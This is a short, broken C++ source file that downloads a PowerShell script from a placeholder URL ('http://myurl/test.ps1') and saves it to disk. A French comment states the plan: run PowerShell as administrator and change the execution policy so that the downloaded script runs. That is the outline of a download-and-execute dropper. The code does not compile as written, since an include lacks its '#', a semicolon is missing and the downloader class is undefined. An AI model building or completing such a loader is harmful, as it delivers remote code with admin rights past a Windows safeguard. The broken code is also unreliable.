#include <iostream> include <fstream>
using namespace std;
void DownloadAndSave(std::string url, std::string filename)
{
    HTTPDownloader downloader;
	std::string content = downloader.download(url);
	ofstream myfile;
	myfile.open (filename.c_str());
	myfile.write(content.data(), content.size());
	myfile.close();
}
int main() {
    /*Le but sera d'enregistrer le ps1 sur le disque , d'exécuter un 
powershell en admin et de changer le Set-Execution Policy pour que le 
ps1 s'exécute*/
    /*ifstream my_script("script.ps1",ios::in);
    if(my_script)
    {
        string line;
        while(getline(my_script, line))
        {
            cout << line << endl;
        }
    }*/
    DownloadAndSave("http://myurl/test.ps1","script.ps1")
    return 0;
}
